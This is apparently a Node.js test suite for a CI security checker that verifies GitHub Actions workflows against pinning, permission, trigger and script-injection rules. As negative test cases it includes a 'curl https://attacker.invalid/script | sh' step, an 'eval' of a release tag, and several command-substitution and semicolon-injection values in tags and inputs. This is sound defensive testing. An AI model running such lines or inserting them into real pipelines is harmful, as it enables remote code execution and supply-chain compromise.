'use strict';
const assert = require('node:assert/strict');
const { test } = require('node:test');
const fs = require('node:fs');
const path = require('node:path');
const { spawnSync } = require('node:child_process');
const YAML = require('./node_modules/yaml');
const { inspectWorkflow, auditPlan, selectWorkflows, auditsAllScopes, MCP_TAG_GUARD, REGISTRY_GUARD } = require('../check_security_safeguards.cjs');
const valid = `permissions:
  contents: read
jobs:
  check:
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
        with:
          persist-credentials: false
`;
test('accepts pinned actions and read-only token access', () => assert.deepEqual(inspectWorkflow(valid, 'verify.yml'), []));
test('accepts a named checkout step and equivalent inline YAML', () => {
  assert.deepEqual(inspectWorkflow(valid.replace('- uses:', '- name: Checkout\n        uses:'), 'verify.yml'), []);
  assert.deepEqual(inspectWorkflow(valid.replace('permissions:\n  contents: read', 'permissions: {contents: read}').replace('with:\n          persist-credentials: false', 'with: {persist-credentials: false}'), 'verify.yml'), []);
});
test('rejects mutable tags and persisted checkout credentials', () => {
  assert.ok(inspectWorkflow(valid.replace(/@[a-f0-9]{40}/, '@v4'), 'verify.yml').some((x) => x.includes('commit SHA')));
  assert.ok(inspectWorkflow(valid.replace('persist-credentials: false', 'persist-credentials: true'), 'verify.yml').some((x) => x.includes('persist')));
});
test('rejects workflow-wide write permissions and privileged PR execution', () => {
  assert.ok(inspectWorkflow(valid.replace('contents: read', 'contents: write'), 'verify.yml').length);
  assert.ok(inspectWorkflow('on:\n  pull_request_target:\n' + valid, 'verify.yml').some((x) => x.includes('pull_request_target')));
  assert.ok(inspectWorkflow('on: [pull_request_target]\n' + valid, 'verify.yml').some((x) => x.includes('pull_request_target')));
  assert.ok(inspectWorkflow(valid.replace('permissions:\n  contents: read', 'permissions: {contents: read, actions: write}'), 'verify.yml').some((x) => x.includes('write permissions')));
});
test('rejects invalid YAML and cannot borrow checkout settings from the next step', () => {
  assert.ok(inspectWorkflow(valid + 'jobs: {}\n', 'verify.yml').some((x) => x.includes('Invalid')));
  assert.ok(inspectWorkflow(valid.replace('        with:', '      - name: Unrelated step\n        with:'), 'verify.yml').some((x) => x.includes('persist')));
});
test('only the release-publishing job may write repository contents', () => {
  const workflow = YAML.parse(valid);
  workflow.on = { push: { tags: ['desktop-v*'] }, workflow_dispatch: null };
  workflow.jobs.windows = { steps: [{ run: 'true' }] };
  workflow.jobs.mac = { steps: [{ run: 'true' }] };
  workflow.jobs['draft-release'] = { ...workflow.jobs.check, 'runs-on': 'ubuntu-latest',
    if: "startsWith(github.ref, 'refs/tags/desktop-v')", needs: ['windows', 'mac'], permissions: { contents: 'write' } };
  delete workflow.jobs.check;
  const draft = YAML.stringify(workflow);
  assert.deepEqual(inspectWorkflow(draft, 'desktop-release.yml'), []);
  assert.ok(inspectWorkflow(draft, 'verify.yml').some((x) => x.includes('write permission')));
  assert.ok(inspectWorkflow(draft.replace('  draft-release:', '  unreviewed:'), 'desktop-release.yml').some((x) => x.includes('write permission')));
});
test('rejects signing secrets exposed to an entire build job', () => {
  const exposed = valid.replace('    steps:', '    env:\n      CSC_LINK: ${{ secrets.WINDOWS_CSC_LINK }}\n    steps:');
  assert.ok(inspectWorkflow(exposed, 'desktop-release.yml').some((x) => x.includes('credentials')));
});
test('audits exact changed manifests and keeps MCP scopes untouched', () => {
  assert.deepEqual(auditPlan(['desktop/mcp/runtime/package-lock.json', 'services/alloflow-remote-mcp/package.json']), []);
  assert.deepEqual(auditPlan(['desktop/web-app/package-lock.json']), [{ directory: 'desktop/web-app', level: 'low' }]);
  assert.deepEqual(auditPlan(['desktop/package.json']), [{ directory: 'desktop', level: 'high' }]);
  assert.deepEqual(auditPlan(['trailer/package-lock.json']), [{ directory: 'trailer', level: 'high' }]);
  assert.deepEqual(auditPlan(['a11y-audit/package-lock.json']), [{ directory: 'a11y-audit', level: 'low' }]);
  assert.deepEqual(auditPlan(['package.json', 'package-lock.json']), [{ directory: '.', level: 'low' }]);
  assert.deepEqual(auditPlan(['desktop/web-app/functions/package-lock.json']), [{ directory: 'desktop/web-app/functions', level: 'low' }]);
  assert.deepEqual(auditPlan(['unrelated/package.json', 'functions/package.json']), []);
  assert.equal(auditPlan([], true).length, 7);
});

test('all workflows including new MCP workflows are automatically checked', () => {
  assert.deepEqual(selectWorkflows(['verify.yml', 'new-release.yaml', 'security-safeguards.yml', 'README.md',
    'remote-mcp-verify.yml', 'mcp-registry-publish.yml', 'mcpb-release.yml', 'new-mcp-check.yaml']),
  ['mcp-registry-publish.yml', 'mcpb-release.yml', 'new-mcp-check.yaml', 'new-release.yaml', 'remote-mcp-verify.yml', 'security-safeguards.yml', 'verify.yml']);
  const future = selectWorkflows(['future-deploy.yml']);
  assert.ok(inspectWorkflow(valid.replace(/@[a-f0-9]{40}/, '@main'), future[0]).length);
  assert.ok(inspectWorkflow(valid.replace(/@[a-f0-9]{40}/, '@main'), selectWorkflows(['future-mcp-check.yml'])[0]).length);
});

const action = repository => repository + '@' + 'a'.repeat(40);
function mcpRelease() {
  return { on: { push: { tags: ['mcpb-v*'] }, pull_request: { branches: ['main'] }, workflow_dispatch: null },
    permissions: { contents: 'read' }, jobs: {
      build: { 'runs-on': 'windows-latest', steps: [{ run: 'npm ci' }] },
      attest: { 'runs-on': 'ubuntu-latest', if: MCP_TAG_GUARD, needs: 'build',
        permissions: { contents: 'read', 'id-token': 'write', attestations: 'write' },
        steps: [{ uses: action('actions/download-artifact') }, { uses: action('actions/attest') }] },
      release: { 'runs-on': 'ubuntu-latest', if: MCP_TAG_GUARD, needs: ['build', 'attest'],
        permissions: { contents: 'write' }, steps: [{ run: 'gh release view "$RELEASE_TAG"', env: { GH_TOKEN: '${{ github.token }}' } }] },
    } };
}
function registry() {
  return { on: { workflow_dispatch: { inputs: { release_tag: { required: true, type: 'string' }, confirmation: { required: true, type: 'string' } } } },
    permissions: { contents: 'read' }, jobs: {
      verify: { 'runs-on': 'ubuntu-latest', steps: [{ run: 'node verify-metadata.cjs' }] },
      publish: { 'runs-on': 'ubuntu-latest', if: REGISTRY_GUARD, needs: 'verify',
        permissions: { contents: 'read', 'id-token': 'write' },
        steps: [{ uses: action('actions/download-artifact') }, { run: './mcp-publisher validate registry-metadata/server.json' }] },
    } };
}
test('reviewed MCP release writes require exact trusted tag boundaries and isolated attestation', () => {
  assert.deepEqual(inspectWorkflow(YAML.stringify(mcpRelease()), 'mcpb-release.yml'), []);
  const mutations = [
    workflow => { workflow.jobs.build.permissions = { 'id-token': 'write' }; },
    workflow => { workflow.jobs.attest.if = "github.event_name != 'pull_request'"; },
    workflow => { workflow.jobs.attest.if += ' || true'; },
    workflow => { workflow.jobs.release.if = "startsWith(github.ref, 'refs/tags/mcpb-v')"; },
    workflow => { workflow.jobs.attest.if = MCP_TAG_GUARD.replace('Apomera/AlloFlow', 'attacker/fork'); },
    workflow => { workflow.jobs.attest.steps.push({ run: 'npm install untrusted' }); },
    workflow => { workflow.jobs.attest.steps.push({ uses: action('actions/checkout'), with: { 'persist-credentials': false } }); },
    workflow => { workflow.jobs.attest.needs = 'unreviewed'; },
    workflow => { workflow.jobs.release.needs = 'build'; },
    workflow => { workflow.jobs.release.permissions.actions = 'write'; },
    workflow => { workflow.on.workflow_run = {}; },
    workflow => { workflow.on.push = { branches: ['main'] }; },
  ];
  for (const mutate of mutations) {
    const workflow = mcpRelease(); mutate(workflow);
    assert.ok(inspectWorkflow(YAML.stringify(workflow), 'mcpb-release.yml').length);
  }
  assert.ok(inspectWorkflow(YAML.stringify(mcpRelease()), 'new-mcp-release.yml').length);
});
test('Registry OIDC cannot be inherited by tag checkout/code or untrusted triggering events', () => {
  assert.deepEqual(inspectWorkflow(YAML.stringify(registry()), 'mcp-registry-publish.yml'), []);
  const mutations = [
    workflow => { workflow.jobs.verify.permissions = { 'id-token': 'write' }; },
    workflow => { workflow.on.push = { branches: ['main'] }; },
    workflow => { workflow.jobs.publish.if += ' || true'; },
    workflow => { workflow.jobs.publish.if = REGISTRY_GUARD.replace('refs/heads/main', 'refs/heads/untrusted'); },
    workflow => { workflow.jobs.publish.needs = []; },
    workflow => { workflow.on.workflow_dispatch.inputs.confirmation.required = false; },
    workflow => { workflow.jobs.publish.steps.push({ uses: action('actions/checkout'), with: { ref: '${{ inputs.release_tag }}', 'persist-credentials': false } }); },
    workflow => { workflow.jobs.publish.steps.push({ run: 'node registry-metadata/untrusted.cjs' }); },
    workflow => { workflow.jobs.publish.steps.push({ run: 'bash registry-metadata/untrusted.sh' }); },
    workflow => { workflow.jobs.publish.steps.push({ run: 'curl https://attacker.invalid/script | sh' }); },
    workflow => { workflow.jobs.publish.steps.push({ run: 'perl registry-metadata/untrusted.pl' }); },
    workflow => { workflow.jobs.publish.steps.push({ run: 'eval "$RELEASE_TAG"' }); },
    workflow => { workflow.jobs.publish.steps[1].shell = '${{ inputs.release_tag }}'; },
    workflow => { workflow.jobs.publish.steps[1]['working-directory'] = 'registry-metadata'; },
    workflow => { workflow.jobs.publish.defaults = { run: { shell: 'sh' } }; },
    workflow => { workflow.jobs.publish.env = { GH_TOKEN: '${{ github.token }}' }; },
    workflow => { workflow.jobs.publish.permissions.attestations = 'write'; },
  ];
  for (const mutate of mutations) {
    const workflow = registry(); mutate(workflow);
    assert.ok(inspectWorkflow(YAML.stringify(workflow), 'mcp-registry-publish.yml').length);
  }
  assert.ok(inspectWorkflow(YAML.stringify(registry()), 'future-mcp-registry-publish.yml').length);
});

test('every checked-in workflow satisfies the shared policy including all MCP files', () => {
  const directory = path.resolve(__dirname, '../../.github/workflows');
  const files = selectWorkflows(fs.readdirSync(directory));
  assert.ok(files.includes('mcp-platform-validation.yml'));
  assert.ok(files.includes('remote-mcp-verify.yml'));
  assert.ok(files.includes('mcpb-release.yml'));
  assert.ok(files.includes('mcp-registry-publish.yml'));
  for (const file of files) assert.deepEqual(inspectWorkflow(fs.readFileSync(path.join(directory, file), 'utf8'), file), [], file);
});

test('blocking browser delivery CI runs both host regressions and real SRI after installing its browser', () => {
  const workflow = YAML.parse(fs.readFileSync(path.resolve(__dirname, '../../.github/workflows/verify.yml'), 'utf8'));
  assert.deepEqual(workflow.on.push.branches, ['**']);
  assert.ok(Object.hasOwn(workflow.on, 'pull_request'));
  const job = workflow.jobs['remediation-preservation'];
  assert.ok(!job['continue-on-error']);
  const install = job.steps.findIndex(step => step.run === 'npx playwright install chromium');
  assert.ok(install >= 0);
  for (const command of [
    'npx vitest run tests/browser_delivery_integrity.test.js tests/browser_delivery_loaders.test.js tests/browser_delivery_global_helpers.test.js tests/optional_browser_delivery_policy.test.js tests/optional_browser_delivery_loaders.test.js tests/browser_delivery_stem_helpers.test.js tests/runtime_graph_delivery_policy.test.js tests/runtime_graph_host.test.js tests/tool_private_script_delivery.test.js tests/document_runtime_integrity.test.js tests/service_worker_release_identity.test.js tests/browser_release_cache_security.test.js tests/browser_release_publication.test.js tests/desktop_app_build_parity.test.js --maxWorkers=1',
    'node --test --test-concurrency=1 dev-tools/security/test-runtime-delivery-builder.cjs dev-tools/security/test-browser-runtime-builder.cjs tests/runtime_graph_engine_adapters.test.cjs',
    'node --test --test-concurrency=1 dev-tools/security/test-runtime-graph-policy.cjs',
    'node --test --test-concurrency=1 dev-tools/security/test-document-runtime-browser.cjs',
    'node --test --test-concurrency=1 dev-tools/security/test-data-kernel-runtime-browser.cjs',
    'node --test --test-concurrency=1 dev-tools/security/test-browser-runtime-graphs.cjs',
    'node dev-tools/build_runtime_graph_delivery_policy.cjs --check',
    'node dev-tools/check_private_loader_coverage.cjs --check',
    'node --test dev-tools/security/test-browser-delivery.cjs',
    'node --test dev-tools/security/test-optional-browser-delivery.cjs',
    'node dev-tools/check_app_update_browser.cjs',
  ]) {
    const index = job.steps.findIndex(step => step.run === command);
    assert.ok(index > install, command);
    assert.ok(!job.steps[index]['continue-on-error']);
    assert.equal(job.steps[index].if, undefined);
  }
  assert.deepEqual(job.steps.find(step => step.run === 'node dev-tools/check_app_update_browser.cjs').env,
    { ALLO_UPDATE_REPORT: 'test-results/remediation-validation/browser-update-results.json' });
  const evidence = job.steps.find(step => step.name === 'Retain remediation validation evidence');
  assert.deepEqual(evidence.with.path.trim().split('\n'), ['test-results/remediation-validation/',
    'tmp/private-loader-security-20261024/runtime-graph-policy-native.json',
    'tmp/private-loader-security-20261024/data-kernel-native.json',
    'tmp/private-loader-security-20261024/runtime-staging/browser-runtime-smoke.json',
    'tmp/document-runtime-security-20261024/browser-results.json']);
});

test('scheduled and manual runs audit unchanged scopes; ordinary pushes stay scoped', () => {
  for (const event of ['schedule', 'workflow_dispatch']) {
    assert.equal(auditPlan([], auditsAllScopes(event)).length, 7);
  }
  assert.deepEqual(auditPlan([], auditsAllScopes('push')), []);
  assert.deepEqual(auditPlan(['desktop/mcp/runtime/package-lock.json'], auditsAllScopes('pull_request')), []);
});

test('rejects input, event, output and secret expressions in executable scripts', () => {
  const expressions = [
    'inputs.composition', "inputs['crf']", 'github.event.pull_request.title',
    "github['event']['inputs']['crf']", 'github.head_ref', 'env.TITLE',
    'vars.RENDER_FLAGS', 'steps.prepare.outputs.flags', 'needs.prepare.outputs.flags',
    'secrets.SIGNING_KEY', "format('{0}', inputs.crf)",
    "github.event_name == 'push' && github.ref || inputs.ref",
  ];
  for (const expression of expressions) {
    for (const field of ['run', 'script']) {
      const workflow = YAML.parse(valid);
      const code = 'echo "${{ ' + expression + ' }}"';
      workflow.jobs.check.steps.push(field === 'run' ? { run: code } : {
        uses: 'actions/github-script@' + 'a'.repeat(40), with: { script: code },
      });
      assert.ok(inspectWorkflow(YAML.stringify(workflow), 'verify.yml')
        .some((error) => error.includes('inline script interpolation')), expression + ' in ' + field);
    }
  }
});

test('permits environment inputs and action parameters without inserting them into code', () => {
  const workflow = YAML.parse(valid);
  workflow.jobs.check.steps.push({
    env: { TITLE: '${{ github.event.pull_request.title }}' }, run: 'printf "%s" "$TITLE"',
  }, {
    uses: 'actions/github-script@' + 'a'.repeat(40),
    env: { TITLE: '${{ inputs.title }}' }, with: { script: 'return process.env.TITLE;' },
  });
  assert.deepEqual(inspectWorkflow(YAML.stringify(workflow), 'verify.yml'), []);
});

test('retains static numeric sharding but rejects dynamic matrices and unsafe include overrides', () => {
  const workflow = YAML.parse(valid);
  const job = workflow.jobs.check;
  job.steps.push({ run: 'npm run test:ci:shard -- --shard=${{ matrix.shard }}/8' });
  job.strategy = { matrix: { shard: [1, 2, 3, 4, 5, 6, 7, 8] } };
  assert.deepEqual(inspectWorkflow(YAML.stringify(workflow), 'verify.yml'), []);
  job.strategy.matrix.include = [{ shard: 9 }];
  assert.deepEqual(inspectWorkflow(YAML.stringify(workflow), 'verify.yml'), []);
  for (const matrix of [
    '${{ fromJSON(needs.prepare.outputs.matrix) }}',
    { shard: ['1', '2$(printf INJECTED)'] },
    { shard: [1, 2], include: [{ shard: '3; printf INJECTED' }] },
    { shard: [1, 2], include: '${{ fromJSON(inputs.extra) }}' },
  ]) {
    job.strategy.matrix = matrix;
    assert.ok(inspectWorkflow(YAML.stringify(workflow), 'verify.yml')
      .some((error) => error.includes('inline script interpolation')));
  }
});

const trailerWorkflow = () => YAML.parse(fs.readFileSync(path.resolve(__dirname, '../../.github/workflows/trailer-render.yml'), 'utf8'));
const bash = process.platform === 'win32'
  ? path.join(process.env.ProgramFiles || 'C:/Program Files', 'Git/bin/bash.exe') : '/bin/bash';
const bashOptions = { skip: !fs.existsSync(bash) && process.platform === 'win32' ? 'Git Bash is not installed; Linux CI requires Bash' : false };

const registryWorkflow = () => YAML.parse(fs.readFileSync(path.resolve(__dirname, '../../.github/workflows/mcp-registry-publish.yml'), 'utf8'));
test('Registry verification transfers bounded metadata and verifies the exact tag attestation before OIDC', () => {
  const { verify, publish } = registryWorkflow().jobs;
  assert.equal(verify.if, REGISTRY_GUARD);
  assert.deepEqual(verify.permissions, { contents: 'read' });
  assert.equal(publish.needs, 'verify');
  assert.equal(publish.if, REGISTRY_GUARD);
  const upload = verify.steps.find(step => step.uses?.startsWith('actions/upload-artifact@'));
  const download = publish.steps.find(step => step.uses?.startsWith('actions/download-artifact@'));
  assert.deepEqual(upload.with, { name: 'verified-mcp-registry-${{ github.run_id }}', 'if-no-files-found': 'error', path: 'release-assets/server.json' });
  assert.deepEqual(download.with, { name: upload.with.name, path: 'registry-metadata' });
  const provenance = verify.steps.find(step => step.name === 'Verify checksum and GitHub build provenance').run;
  assert.match(provenance, /--cert-identity "https:\/\/github\.com\/\$GITHUB_REPOSITORY\/\.github\/workflows\/mcpb-release\.yml@refs\/tags\/\$RELEASE_TAG"/);
  assert.match(provenance, /--source-ref "refs\/tags\/\$RELEASE_TAG" --source-digest "\$source_sha" --deny-self-hosted-runners/);
  assert.match(provenance, /source_sha="\$\(git rev-parse HEAD\)"/);
  const bounds = publish.steps.find(step => step.name === 'Require a bounded regular metadata file').run;
  assert.match(bounds, /test -f registry-metadata\/server\.json/);
  assert.match(bounds, /test ! -L registry-metadata\/server\.json/);
  assert.match(bounds, /-le 262144/);
  for (const job of [verify, publish]) {
    assert.equal(job['continue-on-error'], undefined);
    assert.ok(job.steps.every(step => !step['continue-on-error']));
  }
});

test('Registry confirmation rejects malicious tag inputs before any checkout or publication', bashOptions, () => {
  const step = registryWorkflow().jobs.verify.steps[0];
  const env = { ...process.env, MCP_NAME: 'io.github.Apomera/alloflow-remediation' };
  delete env.BASH_ENV;
  delete env.ENV;
  const cases = [
    ['mcpb-v1.2.3', 'PUBLISH ' + env.MCP_NAME, 0],
    ['mcpb-v1.2.3-rc.1', 'PUBLISH ' + env.MCP_NAME, 0],
    ['mcpb-v1.2.3', 'publish ' + env.MCP_NAME, 1],
    ...['--repo=attacker/fork', 'main', 'mcpb-v1.2.3; printf INJECTED',
      'mcpb-v1.2.3$(printf INJECTED)', '`printf INJECTED`', 'mcpb-v1.2.3\nprintf INJECTED']
      .map(tag => [tag, 'PUBLISH ' + env.MCP_NAME, 1]),
  ];
  for (const [tag, confirmation, status] of cases) {
    const result = spawnSync(bash, ['--noprofile', '--norc', '-eo', 'pipefail', '-s'], {
      input: step.run, env: { ...env, RELEASE_TAG: tag, CONFIRMATION: confirmation },
      encoding: 'utf8', timeout: 10000, windowsHide: true,
    });
    assert.ifError(result.error);
    assert.equal(result.status, status, result.stderr);
    assert.doesNotMatch(result.stdout + result.stderr, /INJECTED/);
  }
});

test('actual Registry asset verifier rejects changed bytes, alternate checksum targets and nonregular or oversized data', () => {
  const os = require('node:os');
  const crypto = require('node:crypto');
  const source = registryWorkflow().jobs.verify.steps.find(step => step.name === 'Verify checksum and GitHub build provenance').run;
  const script = /node <<'NODE'\n([\s\S]*?)\nNODE/.exec(source)?.[1];
  assert.ok(script, 'execute the actual pre-provenance asset verifier');
  const directory = fs.mkdtempSync(path.join(os.tmpdir(), 'alloflow-registry-boundary-'));
  try {
    fs.mkdirSync(path.join(directory, 'release-assets'));
    const asset = name => path.join(directory, 'release-assets', name);
    const bytes = Buffer.from('synthetic-checksum-fixture');
    const digest = crypto.createHash('sha256').update(bytes).digest('hex');
    const reset = () => {
      fs.writeFileSync(asset('alloflow-remediation.mcpb'), bytes);
      fs.writeFileSync(asset('SHA256SUMS.txt'), digest + '  alloflow-remediation.mcpb\n');
      fs.writeFileSync(asset('server.json'), '{"name":"synthetic-test"}');
    };
    const run = () => {
      const result = spawnSync(process.execPath, ['-e', script], { cwd: directory, encoding: 'utf8', timeout: 10000, windowsHide: true });
      assert.ifError(result.error);
      return result.status;
    };
    reset(); assert.equal(run(), 0);
    fs.appendFileSync(asset('alloflow-remediation.mcpb'), 'changed'); assert.notEqual(run(), 0);
    reset(); fs.writeFileSync(asset('SHA256SUMS.txt'), digest + '  another.mcpb\n'); assert.notEqual(run(), 0);
    reset(); fs.writeFileSync(asset('SHA256SUMS.txt'), digest + '  alloflow-remediation.mcpb\n' + digest + '  another.mcpb\n'); assert.notEqual(run(), 0);
    reset(); fs.truncateSync(asset('server.json'), 262145); assert.notEqual(run(), 0);
    reset(); fs.rmSync(asset('server.json')); fs.mkdirSync(asset('server.json')); assert.notEqual(run(), 0);
  } finally {
    fs.rmSync(directory, { recursive: true, force: true });
  }
});

function runRenderScript(script, composition, crf) {
  const env = { ...process.env, TRAILER_COMPOSITION: composition, TRAILER_CRF: crf };
  delete env.BASH_ENV;
  delete env.ENV;
  // Intercept the CLI at its argument boundary: no downloads, renders or network.
  const result = spawnSync(bash, ['--noprofile', '--norc', '-eo', 'pipefail', '-s'], {
    input: 'npx() { printf "%s\\0" "$@"; }\n' + script,
    env, encoding: 'utf8', timeout: 10000, windowsHide: true,
  });
  assert.ifError(result.error);
  assert.equal(result.status, 0, result.stderr);
  return result.stdout.split('\0').slice(0, -1);
}

test('trailer render preserves normal arguments and treats shell syntax in inputs as literal data', bashOptions, () => {
  const workflow = trailerWorkflow();
  const step = workflow.jobs.render.steps.find((item) => item.name === 'Render');
  assert.deepEqual(step.env, { TRAILER_COMPOSITION: '${{ inputs.composition }}', TRAILER_CRF: '${{ inputs.crf }}' });
  const normal = [
    [workflow.on.workflow_dispatch.inputs.composition.default, String(workflow.on.workflow_dispatch.inputs.crf.default)],
    ['Another-Trailer', '18'], ['Trailer2', '23'],
  ];
  const payloads = ['$(printf INJECTED)', '`printf INJECTED`', '"; printf INJECTED; #', '20; printf INJECTED', '20\nprintf INJECTED', '20 --codec=vp9', '* ? [abc]'];
  for (const [composition, crf] of [...normal,
    ...payloads.map((value) => [value, '20']), ...payloads.map((value) => ['AlloFlowTrailer', value])]) {
    assert.deepEqual(runRenderScript(step.run, composition, crf), [
      'remotion', 'render', composition, 'out/alloflow-trailer-1080p.mp4',
      '--codec=h264', '--crf=' + crf, '--log=info',
    ]);
  }
});

test('negative control reproduces command substitution in the former trailer workflow', bashOptions, () => {
  const step = trailerWorkflow().jobs.render.steps.find((item) => item.name === 'Render');
  const unsafe = step.run.replace('"$TRAILER_COMPOSITION"', '"Allo$(printf INJECTED)"')
    .replace('--crf="$TRAILER_CRF"', '--crf=20$(printf INJECTED)');
  const args = runRenderScript(unsafe, 'unused', 'unused');
  assert.equal(args[2], 'AlloINJECTED');
  assert.equal(args[5], '--crf=20INJECTED');
});
